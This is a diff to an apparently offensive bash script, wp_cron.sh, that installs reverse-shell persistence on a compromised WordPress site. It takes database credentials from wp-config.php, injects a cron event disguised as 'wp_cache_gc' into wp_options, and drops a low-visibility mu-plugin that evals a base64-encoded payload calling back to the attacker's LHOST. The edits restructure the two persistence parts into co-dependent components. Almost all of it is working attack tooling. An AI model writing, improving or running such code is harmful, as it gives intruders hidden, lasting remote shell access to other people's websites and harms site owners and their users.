@@ -2,9 +2,8 @@
 # =============================================================================
 # wp_cron.sh — WordPress wp-cron persistence
 #
-# Installs a reverse-shell callback into WordPress's cron system via two
-# complementary methods (DB injection + mu-plugin fallback), following the
-# same conventions as the rest of the toolkit.
+# Installs a reverse-shell callback into WordPress's cron system using two
+# co-dependent components that must both be present for the mechanism to work.
 #
 # Usage:
 #   export LHOST=<attacker ip>
@@ -13,17 +12,20 @@
 #
 #   If no path is given the script will auto-discover wp-config.php.
 #
-# Methods (attempted in order, both installed if possible):
-#   1. DB injection  — writes a serialized cron event directly into wp_options
-#                      via mysql CLI. No file writes to the WP directory.
-#                      Fires as soon as any HTTP request hits the site.
-#   2. mu-plugin     — drops a small PHP file into wp-content/mu-plugins/.
-#                      Auto-loaded by WordPress with no activation required.
-#                      Survives DB wipes/restores.
+# Components (both are installed, both are required):
+#   cron entry (DB) — writes a serialized wp_cache_gc event into wp_options
+#                     so wp-cron knows the hook exists and when to fire it.
+#                     Requires php CLI and readable wp-config.php for DB creds.
+#
+#   hook callback   — drops a mu-plugin into wp-content/mu-plugins/ that
+#   (mu-plugin)       registers the _wpcm_fire() function as the handler for
+#                     wp_cache_gc. Without this the cron entry fires but nothing
+#                     executes. Also self-reschedules the cron entry if missing.
+#                     Requires write access to the WordPress directory.
 #
 # Requirements:
-#   - mysql CLI available on target (for method 1)
-#   - Write access to the WordPress directory (for method 2)
+#   - php CLI available on target (for cron entry)
+#   - Write access to the WordPress directory (for hook callback)
 #   - LHOST set in environment
 # =============================================================================
 
@@ -125,7 +127,7 @@ if [[ "$DB_HOST" == *"/"* ]]; then
 fi
 
 if [[ -z "$DB_NAME" || -z "$DB_USER" ]]; then
-    warn "Could not parse DB credentials — method 1 (DB injection) will be skipped"
+    warn "Could not parse DB credentials — cron entry component will be skipped"
     DB_AVAILABLE=false
 else
     success "DB: ${DB_USER}@${DB_HOST} / ${DB_NAME} (prefix: ${DB_PREFIX})"
@@ -164,22 +166,21 @@ PHP_B64=$(printf '%s' "$PHP_PAYLOAD" | base64 | tr -d '\n')
 PHP_CALLBACK="eval(base64_decode('${PHP_B64}'));"
 
 # =============================================================================
-# Method 1 — DB injection via mysql CLI
+# Component 1 — Cron entry (DB injection)
 # =============================================================================
 #
 # WordPress stores its cron schedule as a serialized PHP array in wp_options
-# under the key 'cron'.  We read the current value, append our event, and
-# write it back.  Using WP-CLI's own serialization format keeps WP happy.
+# under the key 'cron'. We append our wp_cache_gc event so wp-cron knows to
+# fire the hook. The mu-plugin (component 2) provides the actual callback.
 #
-# We inject via a small self-contained PHP script run with the system php CLI
-# rather than trying to hand-craft the serialized string in bash — this is
-# more robust and handles any existing cron entries correctly.
+# We inject via a small self-contained PHP script rather than hand-crafting
+# the serialized string in bash — more robust across different WP states.
 
-METHOD1_OK=false
+CRON_ENTRY_OK=false
 
 if [[ "$DB_AVAILABLE" == true ]] && command -v php &>/dev/null; then
 
-    info "Method 1: DB injection via php + mysql..."
+    info "Installing cron entry (DB injection)..."
 
     # Build mysql connection args
     MYSQL_ARGS=(-u"$DB_USER" -p"$DB_PASS" "$DB_NAME")
@@ -260,51 +261,51 @@ PHPSCRIPT
     rm -f "$INJECTOR_TMP"
 
     if echo "$INJECT_RESULT" | grep -q "INJECTED"; then
-        success "Method 1: cron event injected into wp_options (hook: ${HOOK_NAME})"
-        METHOD1_OK=true
+        success "Cron entry installed in wp_options (hook: ${HOOK_NAME})"
+        CRON_ENTRY_OK=true
     elif echo "$INJECT_RESULT" | grep -q "ALREADY_INSTALLED"; then
-        warn "Method 1: cron event already present — skipping"
-        METHOD1_OK=true
+        warn "Cron entry already present — skipping"
+        CRON_ENTRY_OK=true
     else
-        warn "Method 1: DB injection failed — ${INJECT_RESULT}"
+        warn "Cron entry install failed — ${INJECT_RESULT}"
     fi
 
 elif [[ "$DB_AVAILABLE" == false ]]; then
-    warn "Method 1: skipped (no DB credentials)"
+    warn "Cron entry skipped (no DB credentials)"
 elif ! command -v php &>/dev/null; then
-    warn "Method 1: skipped (php CLI not available)"
+    warn "Cron entry skipped (php CLI not available)"
 fi
 
 # =============================================================================
-# Method 2 — mu-plugin drop
+# Component 2 — Hook callback (mu-plugin)
 # =============================================================================
 #
-# mu-plugins (must-use plugins) live in wp-content/mu-plugins/ and are loaded
-# automatically by WordPress on every request — no activation needed, and they
-# don't appear in the standard Plugins list (only under Must-Use).
+# mu-plugins live in wp-content/mu-plugins/ and are loaded automatically by
+# WordPress on every request — no activation needed, not visible in the
+# standard Plugins list (only under Must-Use).
 #
-# Our plugin does two things:
-#   a) Registers our custom 5-minute schedule so WP doesn't discard the event
-#   b) Hooks our callback onto HOOK_NAME and evals the payload
+# This plugin registers _wpcm_fire() as the callback for wp_cache_gc.
+# Without it the cron entry fires but nothing executes. It also
+# self-reschedules the cron entry if it goes missing.
 
-METHOD2_OK=false
+HOOK_CALLBACK_OK=false
 
 MU_DIR="${WP_ROOT}/wp-content/mu-plugins"
 MU_FILE="${MU_DIR}/${PLUGIN_FILE_NAME}"
 
 if [[ ! -d "$MU_DIR" ]]; then
-    info "Method 2: mu-plugins directory does not exist — attempting to create..."
-    mkdir -p "$MU_DIR" 2>/dev/null || { warn "Method 2: cannot create ${MU_DIR} — skipping"; MU_SKIP=true; }
+    info "Hook callback: mu-plugins directory does not exist — attempting to create..."
+    mkdir -p "$MU_DIR" 2>/dev/null || { warn "Hook callback: cannot create ${MU_DIR} — skipping"; MU_SKIP=true; }
 fi
 
 if [[ "${MU_SKIP:-false}" == false ]]; then
     if [[ -f "$MU_FILE" ]]; then
-        warn "Method 2: mu-plugin already exists at ${MU_FILE} — skipping"
-        METHOD2_OK=true
+        warn "Hook callback: mu-plugin already exists at ${MU_FILE} — skipping"
+        HOOK_CALLBACK_OK=true
     elif [[ ! -w "$MU_DIR" ]]; then
-        warn "Method 2: ${MU_DIR} is not writable — skipping"
+        warn "Hook callback: ${MU_DIR} is not writable — skipping"
     else
-        info "Method 2: dropping mu-plugin at ${MU_FILE}..."
+        info "Hook callback: installing mu-plugin at ${MU_FILE}..."
 
         cat > "$MU_FILE" <<MUPLUGIN
 <?php
@@ -340,8 +341,8 @@ if (!wp_next_scheduled('${HOOK_NAME}')) {
 MUPLUGIN
 
         chmod 644 "$MU_FILE"
-        success "Method 2: mu-plugin installed at ${MU_FILE}"
-        METHOD2_OK=true
+        success "Hook callback: mu-plugin installed at ${MU_FILE}"
+        HOOK_CALLBACK_OK=true
     fi
 fi
 
@@ -358,21 +359,25 @@ info  " Hook name      : ${HOOK_NAME}"
 info  " Schedule       : every 5 minutes"
 info  " Callback       : ${LHOST}:${LPORT}"
 info  "-------------------------------------------"
-[[ "$METHOD1_OK" == true ]] && success " DB injection   : OK" || warn " DB injection   : FAILED / SKIPPED"
-[[ "$METHOD2_OK" == true ]] && success " mu-plugin      : OK" || warn " mu-plugin      : FAILED / SKIPPED"
+[[ "$CRON_ENTRY_OK"    == true ]] && success " Cron entry (DB)   : OK" || warn " Cron entry (DB)   : FAILED / SKIPPED"
+[[ "$HOOK_CALLBACK_OK" == true ]] && success " Hook callback     : OK" || warn " Hook callback     : FAILED / SKIPPED"
 info  "==========================================="
 echo ""
 
-if [[ "$METHOD1_OK" == false && "$METHOD2_OK" == false ]]; then
-    error "All methods failed — no persistence installed"
+if [[ "$CRON_ENTRY_OK" == false && "$HOOK_CALLBACK_OK" == false ]]; then
+    error "Both components failed — no persistence installed"
     exit 1
+fi
+
+if [[ "$CRON_ENTRY_OK" == false || "$HOOK_CALLBACK_OK" == false ]]; then
+    warn "Only one component installed — persistence will not fire until both are present"
 fi
 
 info  "Trigger a callback manually:"
 info  "  curl -s http://<target>/wp-cron.php?doing_wp_cron >/dev/null"
 echo ""
 info  "Remove:"
-[[ "$METHOD2_OK" == true ]] && info "  rm ${MU_FILE}"
-[[ "$METHOD1_OK" == true ]] && info "  # Also clear the injected wp_options rows:"
-[[ "$METHOD1_OK" == true ]] && info "  DELETE FROM ${DB_PREFIX}options WHERE option_name IN ('cron','_wpcm_cb');"
+[[ "$HOOK_CALLBACK_OK" == true ]] && info "  rm ${MU_FILE}"
+[[ "$CRON_ENTRY_OK"    == true ]] && info "  # Also clear the injected wp_options rows:"
+[[ "$CRON_ENTRY_OK"    == true ]] && info "  DELETE FROM ${DB_PREFIX}options WHERE option_name IN ('cron','_wpcm_cb');"
 info  "  (Then restore a clean 'cron' option value)"
